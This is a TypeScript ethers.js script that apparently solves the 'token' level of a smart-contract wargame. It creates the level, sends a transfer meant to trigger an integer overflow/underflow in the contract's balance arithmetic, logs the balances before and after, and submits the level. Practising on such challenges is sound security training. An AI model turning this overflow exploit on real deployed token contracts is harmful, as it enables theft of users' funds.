import { ethers } from "ethers";
import { getSigner } from "./signer";

import { BigNumber, BytesLike } from "ethers";
import { Token__factory } from "../typechain/ethers-v5";
import { createLevel, submitLevel } from "./utils";



async function main() {
  const signer = getSigner();
  const level = await createLevel(signer, "token");
  const randomAddress = level;
  const contract = Token__factory.connect(level, signer);

  await SendOverflowNumber();


  async function SendOverflowNumber() {
    console.log("main balances:", (await contract.balanceOf(await signer.getAddress())).toString());
    console.log("support balances:", (await contract.balanceOf(randomAddress)).toString());

    const tx = await contract.transfer(randomAddress, ethers.utils.parseEther("0.001"));
    const receipt = await tx.wait();
    console.log(receipt);

    console.log("main balances:", (await contract.balanceOf(await signer.getAddress())).toString());
    console.log("support balances:", (await contract.balanceOf(randomAddress)).toString());
  }

  await submitLevel(signer,level);
}
main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
